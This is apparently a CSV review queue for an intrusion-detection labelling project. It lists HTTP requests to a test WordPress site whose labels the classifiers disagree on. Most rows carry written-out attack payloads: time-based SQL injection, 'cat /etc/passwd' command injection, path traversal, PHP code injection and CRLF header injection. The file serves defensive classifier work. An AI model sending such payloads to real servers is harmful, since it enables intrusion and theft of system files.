review_id,row_position,review_priority_score,review_reason,text_input,base_predicted_labels,rules_predicted_labels,embeddings_predicted_labels,llm_few_shot_predicted_labels,llm_zero_shot_predicted_labels
93,3496,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0' / sleep(15) / ' | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=grandmother; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea,000 - Normal,66 - SQL Injection,242 - Code Injection,,
94,3506,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-includes/js/media-views.min.js%27+%2F+sleep%2815%29+%2F+%27?ver=4.9.5 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=emphasis; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea,000 - Normal,66 - SQL Injection,242 - Code Injection,,
95,3594,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog%25%27%29+AND+3648%3D6095+AND+%28%27%25%27%3D%27/index.php/2020/03/22 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/page/2/ | request_host: test-site.com,000 - Normal,66 - SQL Injection,194 - Fake the Source of Data,,
96,3963,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog%25%27%29+AND+1336%3D5757--+-/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com,000 - Normal,66 - SQL Injection,88 - OS Command Injection,,
97,3977,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020/03/23%27+AND+9162%3D4641+AND+%27iglQ%27%3D%27iglQ/fuga-aut-recusandae-sed-dolor-quia/embed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=safety; wordpress_test_cookie=WP+Cookie+check,000 - Normal,66 - SQL Injection,242 - Code Injection,,
98,3987,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020%25%27+AND+8039%3D8039+AND+%27%25%27%3D%27/03/23/fuga-aut-recusandae-sed-dolor-quia/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=message; wordpress_test_cookie=WP+Cookie+check,000 - Normal,66 - SQL Injection,88 - OS Command Injection,,
99,4024,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020%27+AND+7306%3D6559--+-/03/23/fuga-aut-recusandae-sed-dolor-quia | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=drama; wordpress_test_cookie=WP+Cookie+check,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
100,4154,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020/03%25%27+AND+4698%3D6023+AND+%27%25%27%3D%27/27/qui-ratione-maxime-dolores-consequatur | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=imagination; wordpress_test_cookie=WP+Cookie+check,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
101,4258,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog+AND+3385%3D2866--+-/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com,000 - Normal,66 - SQL Injection,126 - Path Traversal,,
102,4271,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php+AND+7853%3D3580/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=grandmother; wordpress_test_cookie=WP+Cookie+check,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
103,4304,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020/03/27%27%29%29+AND+1836%3D1836--+-/qui-ratione-maxime-dolores-consequatur/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=oven; wordpress_test_cookie=WP+Cookie+check,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
104,4352,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog%25%27%29+AND+2273%3D9278+AND+%28%27%25%27%3D%27/index.php/2020/03/29 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/page/2/ | request_host: test-site.com,000 - Normal,66 - SQL Injection,194 - Fake the Source of Data,,
105,4425,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php%29+AND+1050%3D1050--+-/2020/03/29/distinctio-sequi-officiis-occaecati/embed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=thing; wordpress_test_cookie=WP+Cookie+check,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
106,4458,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020/etc%2Fpasswd/23/fuga-aut-recusandae-sed-dolor-quia/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: wordpress_test_cookie=WP+Cookie+check,000 - Normal,126 - Path Traversal,88 - OS Command Injection,,
107,4481,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/my-account/%253C%2521--/%7B%7B%20data.size.url%20%7D%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/ | request_host: test-site.com | request_cookie: wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,34 - HTTP Response Splitting,,
108,4482,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/%2522%2527/my-account/edit-profile/%7B%7B%20data.sizes.full.url | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/%7B%7B%20data.sizes.full.url%20%7D%7D | request_host: test-site.com | request_cookie: wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,34 - HTTP Response Splitting,,
109,4525,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/sample-page/%24%7B563979%2B995206%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/wp-json/oembed/1.0/embed?format=xml&url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fsample-page%2F | request_host: test-site.com | request_cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595323524%7C6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR%7Cbabde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,194 - Fake the Source of Data,,
110,4576,0.747506,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/themes/twentyseventeen/assets/js.bak | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595323524%7C6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR%7Cbabde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP+Cookie+check,000 - Normal,000 - Normal,34 - HTTP Response Splitting,272 - Protocol Manipulation,126 - Path Traversal
111,2039,0.725394,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22/feed/rss2 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=control; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595207149%7C7vrKhh6jxpp98RJUx8VGGDHWFYfQx5zVgGecAIsQ8NF%7Cbfb64801d857a2742791e66d57f263d6f6d84540757ed11092ac3aa2cda0662f,000 - Normal,000 - Normal,88 - OS Command Injection,242 - Code Injection,153 - Input Data Manipulation
112,2044,0.725394,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B/tag/at-quos-nesciunt-in-amet/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=anxiety; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595207149%7C7vrKhh6jxpp98RJUx8VGGDHWFYfQx5zVgGecAIsQ8NF%7Cbfb64801d857a2742791e66d57f263d6f6d84540757ed11092ac3aa2cda0662f,000 - Normal,000 - Normal,88 - OS Command Injection,242 - Code Injection,153 - Input Data Manipulation
113,586,0.724173,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: POST | request_http_request: /blog/index.php/my-account/ | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/ | request_host: test-site.com | request_cookie: wordpress_test_cookie=WP+Cookie+check | request_content_type: www.google.com:80/ | request_body: username=empathicOrange2&password=4cUxLyW&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2F&login=Login&redirect=&rememberme=forever,000 - Normal,000 - Normal,194 - Fake the Source of Data,000 - Normal,16 - Dictionary-based Password Attack;310 - Scanning for Vulnerable Software
114,2232,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: POST | request_http_request: /blog/index.php/my-account/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=idea; wordpress_test_cookie=WP+Cookie+check | request_content_type: application/x-www-form-urlencoded | request_body: username=pacifiedOcelot4&password=Z39ro!M&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever%26cat+%2Fetc%2Fpasswd%26,000 - Normal,88 - OS Command Injection;126 - Path Traversal;153 - Input Data Manipulation,000 - Normal,,
115,2233,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: POST | request_http_request: /blog/index.php/my-account/edit-profile%7C%7Ccat+%2Fetc%2Fpasswd/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=classroom; wordpress_test_cookie=WP+Cookie+check | request_content_type: application/x-www-form-urlencoded,000 - Normal,88 - OS Command Injection;126 - Path Traversal;153 - Input Data Manipulation,000 - Normal,,
116,2236,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog/index.php/my-account/edit-profile%257C%257Ccat%2B%252Fetc%252Fpasswd/%7B%7B%20attachment.url%20%7D%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=variety; wordpress_test_cookie=WP+Cookie+check,000 - Normal,88 - OS Command Injection;126 - Path Traversal;153 - Input Data Manipulation,000 - Normal,,
117,2239,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog%253Bcat%2B%252Fetc%252Fpasswd%253B/index.php/my-account/edit-profile/%7B%7B%20data.icon%20%7D%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/ | request_host: test-site.com,000 - Normal,88 - OS Command Injection;126 - Path Traversal;153 - Input Data Manipulation,000 - Normal,,
118,2246,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog%2527%253Bcat%2B%252Fetc%252Fpasswd%253B%2527/index.php/my-account/edit-profile/%7B%7B%20data.model.url%20%7D%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/ | request_host: test-site.com,000 - Normal,88 - OS Command Injection;126 - Path Traversal;153 - Input Data Manipulation,000 - Normal,,
119,2352,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog/index.php%3Bcat+%2Fetc%2Fpasswd%3B/wp-json/oembed/1.0/embed?url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fvitae-dolores-quidem-possimus-aut-voluptatibus%2F | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=instance; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595212059%7CGWgAWVHapC2bzAMywZ77DCFlV58k9y04hBeDt9B2wpg%7C59006f949e57d0c4fd439f571f0a913f28f8cabfb99520b35997b552dc918655,000 - Normal,88 - OS Command Injection;126 - Path Traversal;194 - Fake the Source of Data,000 - Normal,,
120,2356,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog/index.php/wp-json/oembed/1.0%7Ccat+%2Fetc%2Fpasswd%23/embed?url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fvitae-dolores-quidem-possimus-aut-voluptatibus%2F | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=management; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595212059%7CGWgAWVHapC2bzAMywZ77DCFlV58k9y04hBeDt9B2wpg%7C59006f949e57d0c4fd439f571f0a913f28f8cabfb99520b35997b552dc918655,000 - Normal,88 - OS Command Injection;126 - Path Traversal;194 - Fake the Source of Data,000 - Normal,,
121,2611,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog/wp-login.php?_wpnonce=7de0abcdc2&action=logout%22%3Bcat+%2Fetc%2Fpasswd%3B%22&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fregistration | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/registration/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=magazine; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595212059%7CGWgAWVHapC2bzAMywZ77DCFlV58k9y04hBeDt9B2wpg%7C59006f949e57d0c4fd439f571f0a913f28f8cabfb99520b35997b552dc918655; wordpress_test_cookie=WP+Cookie+check,000 - Normal,88 - OS Command Injection;126 - Path Traversal;194 - Fake the Source of Data,000 - Normal,,
122,2619,0.716808,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog/wp-login.php?reauth=1%0Acat+%2Fetc%2Fpasswd%0A&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fwp-admin%2Fprofile.php | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/wp-admin/profile.php | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=theory; wordpress_test_cookie=WP+Cookie+check,000 - Normal,126 - Path Traversal;194 - Fake the Source of Data;34 - HTTP Response Splitting,000 - Normal,,
123,155,0.713014,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/index.php/commodi-ut-sint-sequi-excepturi | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/commodi-ut-sint-sequi-excepturi/ | request_host: test-site.com,000 - Normal,126 - Path Traversal,000 - Normal,126 - Path Traversal;34 - HTTP Response Splitting,126 - Path Traversal
124,2907,0.698475,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: POST | request_http_request: /blog/index.php/my-account/any%0D%0ASet-cookie%3A+Tamper%3Da7fc6874-010c-403e-8487-f0f17754fe86%0D%0A?mode=grid | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/?mode=grid | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=growth; wordpress_test_cookie=WP+Cookie+check | request_content_type: application/x-www-form-urlencoded | request_body: username=goofyChowder8&password=WB_tOWY3&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F%3Fmode%3Dgrid&login=Login&redirect=&rememberme=forever,000 - Normal,34 - HTTP Response Splitting,000 - Normal,34 - HTTP Response Splitting;33 - HTTP Request Smuggling,34 - HTTP Response Splitting
125,2923,0.698475,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre;posible_multietiqueta,request_http_method: GET | request_http_request: /blog/index.php/sample-page/any%0ASet-cookie%3A+Tamper%3D23e41759-5436-46f2-88ed-0461d005d268 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/sample-page/ut-aspernatur-est-dolores/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=people; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,000 - Normal,34 - HTTP Response Splitting,000 - Normal,34 - HTTP Response Splitting;33 - HTTP Request Smuggling,34 - HTTP Response Splitting
